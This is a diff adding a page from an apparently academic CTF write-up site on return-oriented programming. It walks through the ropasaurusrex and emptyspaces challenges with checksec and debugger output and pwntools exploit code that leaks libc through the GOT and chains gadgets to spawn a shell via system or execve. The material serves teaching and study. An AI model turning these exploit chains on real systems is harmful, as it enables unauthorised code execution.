@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.725804997873">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 2.4.0">
+
+    <!-- Primary Meta Tags -->
+    <title>ROP</title>
+    <meta name="title" content="ROP">
+    <meta name="description" content="main" />
+
+    <!-- Canonical -->
+    <link rel="canonical" href="/02-rop/" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="/02-rop/">
+    <meta property="og:title" content="ROP">
+    <meta property="og:description" content="main">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="/02-rop/">
+    <meta property="twitter:title" content="ROP">
+    <meta property="twitter:description" content="main">
+
+    <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../resources/css/retype.css?v=2.4.0.725804997873" rel="stylesheet" />
+
+    <script type="text/javascript" src="../resources/js/config.js?v=2.4.0.725804997873" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../resources/js/lunr.js?v=2.4.0.725804997873" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../resources/js/prism.js?v=2.4.0.725804997873" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between grow pr-6 md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../" class="flex items-center leading-snug text-xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Offensive and Defensive Cybersecurity [2021/2022] [056896]</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Challenges summary &amp; write-up</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+        
+                            <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
+                            style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search" />
+                        </div>
+        
+                        <!-- Mobile search button mock -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placehokder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button mock -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
+                </div>
+            
+                <div class="pl-6 mb-4 mt-1">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="grow min-w-0 px-6 md:px-16">
+                        <main class="relative pt-6 pb-16">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="rop" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#rop">#</doc-anchor-trigger>
+        <span>ROP</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="ropasaurusrex-32--bit-rop-chain">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#ropasaurusrex-32--bit-rop-chain">#</doc-anchor-trigger>
+        <span>ropasaurusrex (32- bit <code v-pre>ROP</code> chain)</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-nasm"><code v-pre class="language-nasm">$ pwn checksec ropasaurusrex
+[*] '/home/zerocool/chall/solved/ropasaurusrex/ropasaurusrex'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+$ file ropasaurusrex
+ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped</code></pre>
+</doc-codeblock></div>
+<p><code v-pre>main</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">int main(void) {
+  int res;
+  
+  vuln();
+  res = write(1,&amp;global_buf,4);
+  return res;
+}</code></pre>
+</doc-codeblock></div>
+<p><code v-pre>first_func()</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void vuln(void) {
+  char buf [136];
+  
+  read(0,buf,256);
+  return;
+}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="what-do-we-do">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#what-do-we-do">#</doc-anchor-trigger>
+        <span>what do we do?</span>
+    </h3>
+</doc-anchor-target>
+<p>We have an overflow but we cannot perform a <code v-pre>ROP</code> exploit since we don&#x27;t know where <code v-pre>libc</code> is in memory. Since we cannot print out the stack, we could exploit the <code v-pre>GOT</code> table to leak the address of <code v-pre>system</code>. Since the binary is not <code v-pre>PIE</code>, and the momry addresses of the code are not randomized at runtime, the <code v-pre>GOT</code> table has a permanent address that can be found with Ghidra. From the previous screenshot we can see the address of <code v-pre>read</code>: <code v-pre>804961c</code>, and also the address of <code v-pre>write</code>. Those two functions alone are enough to read and print to screen the content of the file containing the flag.</p>
+<p><strong>how did we find the address of  <code v-pre>write </code> inside the library?</strong></p>
+<p>We search write into Ghidra (<code v-pre>ctrl+shift+e</code>) and we look for a <code v-pre>jmp</code> into the <code v-pre>GOT</code> that has an <code v-pre>&lt;EXTERNAL&gt;::write</code> parameter. Another way of doing that is using <code v-pre>objdump</code> and looking for <code v-pre>&lt;write@plt&gt;</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">objdump -d -M intel ./ropasaurusrex | grep write</code></pre>
+</doc-codeblock></div>
+<p>Note that founding addresses of <code v-pre>GOT</code> is even easier in gdb:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-nasm"><code v-pre class="language-nasm">pwndbg&gt; got
+
+GOT protection: No RELRO | GOT functions: 4
+
+[0x8049610] __gmon_start__ -&gt; 0x8048302 (__gmon_start__@plt+6) ◂— push   0 /* 'h' */
+[0x8049614] write@GLIBC_2.0 -&gt; 0x8048312 (write@plt+6) ◂— push   8
+[0x8049618] __libc_start_main@GLIBC_2.0 -&gt; 0xf7df4e30 (__libc_start_main) ◂— call   0xf7f132c9
+[0x804961c] read@GLIBC_2.0 -&gt; 0x8048332 (read@plt+6) ◂— push   0x18
+pwndbg&gt;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cyclic">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cyclic">#</doc-anchor-trigger>
+        <span><code v-pre>cyclic</code></span>
+    </h3>
+</doc-anchor-target>
+<p>To check how deep are we in the stack we can use <code v-pre>pwn cyclic -n 4 200 | ./ropasaurusrex</code> which generates a pattern of 4 bytes, 200 chars long (since we are in a 32 bit environment, otherwise we would need a 8 bytes pattern). Then we check with gdb what section of the pattern gets into the instruction pointer (for e.g. gdb would print <code v-pre>Invalid address at 0x6261616b</code>), and then we can actually see how long must be our padding, by running:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">❯ cyclic -n 4 -l 0x6261616b
+140</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="leaking-libc">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#leaking-libc">#</doc-anchor-trigger>
+        <span>leaking <code v-pre>libc</code></span>
+    </h3>
+</doc-anchor-target>
+<p>Since the binary is x86, we need to put call arguments on the stack. We need the following stack layout:</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Before / After</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>...</td>
+</tr>
+<tr>
+<td><strong>sEBP</strong> / junk</td>
+</tr>
+<tr>
+<td><strong>sEIP</strong> / <code v-pre>write</code> in <code v-pre>PLT</code> (<strong>what we want to execute</strong>)</td>
+</tr>
+<tr>
+<td>Frame of caller / cleaner gadget (cleans up the next three cells and puts a <code v-pre>ret</code> in order to jump at the address that follows the three stack cells just cleared, which is the address of the <code v-pre>main</code></td>
+</tr>
+<tr>
+<td>Frame of caller / arg #1 (1st argument of what we want to execute, the <code v-pre>fd</code> of the <code v-pre>write</code> target)</td>
+</tr>
+<tr>
+<td>Frame of caller / arg #2 (2nd argument of what we want to execute, what we want to write to <code v-pre>stdout</code>)</td>
+</tr>
+<tr>
+<td>Frame of caller / arg #3 (3rd argument of what we want to execute, how much to write)</td>
+</tr>
+<tr>
+<td>Frame of caller / <code v-pre>main</code> address (<strong>return address</strong> after that the gadget cleans the stack)</td>
+</tr>
+<tr>
+<td>...</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python"># STAGE 1
+# writing to stdout the address of write, and returning
+# a gadget that cleans write's arguments off the stack in order
+# to call again the main.
+params = [
+    e.plt['write'],
+    cleaner,
+    1,
+    e.got['write'],
+    4,
+    main_addr	# return address, we'll make the binary start again
+]							# from the beginning of the main to complete the exploit
+exploit = b''
+exploit += padding
+for p in params:
+    exploit += p32(p)
+input(&quot;[1st stage] press any key to send...&quot;)
+r.send(exploit)
+leak = r.recv()
+leak = unpack(leak, 'all', endian='little', sign=False)
+sysaddr = leak - write_sys_offset
+print('address of system: ' + str(hex(sysaddr)))</code></pre>
+</doc-codeblock></div>
+<p>On top of the stack we have the pointer of the write, the return address (<code v-pre>CCCC</code>, for now we do not need it), and its parameters. The code above, when assembled into shellcode and executed, will execute a <code v-pre>write</code> syscall, which will write to <code v-pre>stdout</code> the address of the <code v-pre>write</code> itself. How did we tell to the <code v-pre>write</code> what to print? We passed as argument in the stack (remember x86 calling convention, which unlike x64 uses the stack instead of the register for function arguments) the address of <code v-pre>write</code> in the <code v-pre>GOT</code> table, which at runtime corresponds to the address of the same function but in <code v-pre>libc</code>. This means that since we know the offset of the <code v-pre>write</code> inside the library, we can compute <code v-pre>libc</code> base to know the address of <code v-pre>system</code>, which is the function that we&#x27;ll use to spawn a shell.</p>
+<p><strong>Note about cleaner gadgets</strong></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">e = ELF('./ropasaurusrex')
+rop = ROP(e)
+libc = ELF(&quot;./libc-2.27.so&quot;)
+write_sys_offset = libc.symbols[&quot;write&quot;] - libc.symbols[&quot;system&quot;]
+binsh_sys_offset = libc.symbols[&quot;write&quot;] - next(libc.search(b&quot;/bin/sh&quot;))
+cleaner = (rop.find_gadget(['pop esi','pop edi','pop ebp','ret']))[0]</code></pre>
+</doc-codeblock></div>
+<p>This gadget will remove the arguments that we put in the stack to correctly execute the call. It is necessary if we want to execute a <code v-pre>ROP</code> chain.</p>
+<doc-anchor-target id="spawning-a-shell">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#spawning-a-shell">#</doc-anchor-trigger>
+        <span>Spawning a shell</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python"># STAGE 2
+# now we will do another rop, but this time
+# we will call system with /bin/sh as argument
+# binsh is already present in the binary, I found
+# its offset using pwntools
+
+print('address of /bin/sh: ' + str(hex(leak+binsh_sys_offset)))
+params = [
+    sysaddr,
+    b'CCCC',
+    leak - binsh_sys_offset
+]
+
+exploit = b''
+exploit += padding
+for p in params:
+    if type(p) is not int:
+        exploit += p
+    else:
+        exploit += p32(p)
+input(&quot;[2nd stage] press any key to send...&quot;)
+r.send(exploit)
+
+input(&quot;press any key to spawn a shell...&quot;)
+r.interactive()</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="emptyspaces-64-bit-rop-chain">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#emptyspaces-64-bit-rop-chain">#</doc-anchor-trigger>
+        <span>emptyspaces (64-bit ROP chain)</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ file easyrop
+easyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=b944b910db4096bc5126a7f2d9285d2a06636a0b, not stripped</code></pre>
+</doc-codeblock></div>
+<p>It is statically linked binary, which means that <code v-pre>libc</code> is already located into the executable itself. That&#x27;s why Ghidra lists lots of functions in the code. As a consequence, we can look for gadgets directly into the binary:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">&gt;&gt;&gt; e = ELF('./emptyspaces')
+&gt;&gt;&gt; rop = ROP(e)
+&gt;&gt;&gt; rop.find_gadget(['pop rdi','ret'])
+&gt;&gt;&gt; Gadget(0x400696, ['pop rdi', 'ret'], ['rdi'], 0x8)</code></pre>
+</doc-codeblock></div>
+<p>Moreover:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">❯ pwn checksec ./emptyspaces
+[*] '/home/zerocool/chall/solved/emptyspaces/emptyspaces'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+</doc-codeblock></div>
+<p>Actually this is weird because there&#x27;s no canary in the binary.</p>
+<p><strong>Note</strong>: if the program crashes it is useful to do a <code v-pre>dmesg</code> to obtain additional info about it. As for security measures:</p>
+<doc-anchor-target id="the-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#the-code">#</doc-anchor-trigger>
+        <span>the code</span>
+    </h3>
+</doc-anchor-target>
+<p><code v-pre>main</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">int main(void)
+
+{
+  char buf [64];
+  
+  setvbuf((FILE *)stdin,(char *)0x0,2,0);
+  setvbuf((FILE *)stdout,(char *)0x0,2,0);
+  puts(&quot;What shall we use\nTo fill the empty spaces\nWhere we used to pwn?&quot;);
+  read(0,buf,137);
+                    /* WARNING: Subroutine does not return */
+  empty(buf);
+}</code></pre>
+</doc-codeblock></div>
+<p><code v-pre>empty</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void empty(char *buf) {
+  int i;
+  
+  for (i = 0; i &lt; 18; i = i + 4) {
+    *(undefined4 *)(buf + (long)i * 4) = 0xc3f48948;
+  }
+  return;
+}</code></pre>
+</doc-codeblock></div>
+<p><strong>Note</strong>:  <code v-pre>empty</code> does not complicates things, since it just fills some space which would be padding anyway. If for example we fill the buffer with 64 &#x27;A&#x27; characters, the stack would look like this:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-nasm"><code v-pre class="language-nasm">pwndbg&gt; x/30gx $rsp
+0x7fffffffdf80: 0x00007fffffffe0f8      0x0000000100000002
+0x7fffffffdf90: 0x41414141c3f48948      0x4141414141414141
+0x7fffffffdfa0: 0x41414141c3f48948      0x4141414141414141
+0x7fffffffdfb0: 0x41414141c3f48948      0x4141414141414141
+0x7fffffffdfc0: 0x41414141c3f48948      0x4141414141414141
+0x7fffffffdfd0: 0x00000000c3f48948      0x0000000000401199
+pwndbg&gt; info frame
+Stack level 0, frame at 0x7fffffffdfe0:
+ rip = 0x400c0e in main; saved rip = 0x401199
+ called by frame at 0x7fffffffe0e0
+ Arglist at 0x7fffffffdfd0, args:
+ Locals at 0x7fffffffdfd0, Previous frame's sp is 0x7fffffffdfe0
+ Saved registers:
+  rbp at 0x7fffffffdfd0, rip at 0x7fffffffdfd8</code></pre>
+</doc-codeblock></div>
+<p><code v-pre>sEBP</code> is overwritten, but we do not need it anyway.</p>
+<doc-anchor-target id="what-to-do">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#what-to-do">#</doc-anchor-trigger>
+        <span>What to do</span>
+    </h3>
+</doc-anchor-target>
+<p>We know that we can perform a buffer overflow, but still we need to leak and put on the stack the canary (if present), and execute at least two syscalls: one to read <code v-pre>/bin/sh</code> and put it in memory, the other one to execute <code v-pre>execve(/bin/sh, 0, 0);</code>. We also need to find some gadgets to setup the registers to run a syscall. Weirdly <code v-pre>ropper</code> won&#x27;t find useful gadgets, while <code v-pre>ROPgadgets</code> works just fine.</p>
+<p>Note that in order to do that we need to restart the execution from main, since the read only takes 137 bytes and our exploit is longer than that. Since the binary is not <code v-pre>PIE</code>, this is possible without leaking any address at runtime.</p>
+<doc-anchor-target id="the-exploit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#the-exploit">#</doc-anchor-trigger>
+        <span>The exploit</span>
+    </h3>
+</doc-anchor-target>
+<p>The payload is made up by some padding necessary to reach <code v-pre>sEIP</code>. Then there is a first payload which is used to call a <code v-pre>read</code> to put in the heap <code v-pre>/bin/sh</code>, then we&#x27;ll pass the string to put it in memory (at an arbitrary address decided by us):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">padding = b'A'*64
+payload = b''
+payload += padding
+payload += b'B'*8
+params = [
+    # read
+    pop_rdx_rsi['address'],
+    8,
+    binsh_addr,
+    pop_rdi['address'],
+    0,
+    syscall_ret['address'],
+    main_addr
+]
+payload += formatter(params)
+print('payload (len : {}):\n{}'.format(len(payload), payload))
+
+input('[1] press any key to send the payload...')
+sender(payload)
+
+input('press any key to send /bin/sh...')
+sender(b'/bin/sh\x00')
+
+</code></pre>
+</doc-codeblock></div>
+<p>After the <code v-pre>read</code> the execution flow is redirected to the <code v-pre>main</code>. When the program executes again a similar exploit is performed again, this time calling an <code v-pre>execve</code> which is used to spawn a shell:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">payload = b''
+payload += padding
+payload += b'B'*8
+params = [
+    # execve
+    pop_rdx_rsi['address'],
+    zeros_addr,
+    zeros_addr,
+    pop_rdi['address'],
+    binsh_addr,
+    pop_rax['address'],
+    0x3b,
+    syscall['address']
+]
+payload += formatter(params)
+print('payload (len : {}):\n{}'.format(len(payload), payload))
+
+input('[2] press any key to send the payload...')
+sender(payload)</code></pre>
+</doc-codeblock></div>
+<p>Source code:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+void empty(char * buffer){
+    for (int i = 0; i&lt;72/4; i+=4)
+        *((int *)buffer + i) = 0xc3f48948;
+}
+
+int main(int argc, char * argv[]){
+    setvbuf(stdin, 0, 2, 0);
+    setvbuf(stdout, 0, 2, 0);
+
+    int i;
+    char buffer[56];
+    printf(&quot;What shall we use\nTo fill the empty spaces\nWhere we used to pwn?\n&quot;);
+    read(0, buffer, 137);
+    empty(buffer);
+
+    return 0;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="easyrop">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#easyrop">#</doc-anchor-trigger>
+        <span>easyrop</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="initial-considerations">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#initial-considerations">#</doc-anchor-trigger>
+        <span>Initial considerations</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
